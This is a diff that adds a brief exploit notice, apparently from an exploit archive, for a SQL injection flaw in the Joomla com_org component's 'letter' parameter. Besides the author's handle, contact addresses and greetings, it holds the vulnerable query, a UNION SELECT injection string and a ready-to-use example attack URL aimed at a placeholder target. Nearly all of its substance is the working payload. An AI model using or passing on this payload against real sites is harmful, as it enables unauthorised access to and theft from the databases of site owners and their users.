@@ -1,0 +1,9 @@
+# Joomla com_org SQL Injection Vulnerability (letter parameter)
+# Author: kazuya
+# Mail: kazuy0r@gmail.com<mailto:kazuy0r@gmail.com> Jabber: kazuya@jabber.ccc.de<mailto:kazuya@jabber.ccc.de>
+# Greetz to back2hack
+
+# Vulnerability
+# Query: SELECT count(*) FROM `jos_org` WHERE (`name` LIKE '<sql>%' || ...
+# SQL: ')+union+select+0,0,0,1,0,2,0,0,0,0,0,0,0,0,0,0,0--+f
+# Example: http://[target].com/index.php?option=com_org&letter=')+union+select+0,0,0,1,0,2,0,0,0,0,0,0,0,0,0,0,0--+f&task=indexs
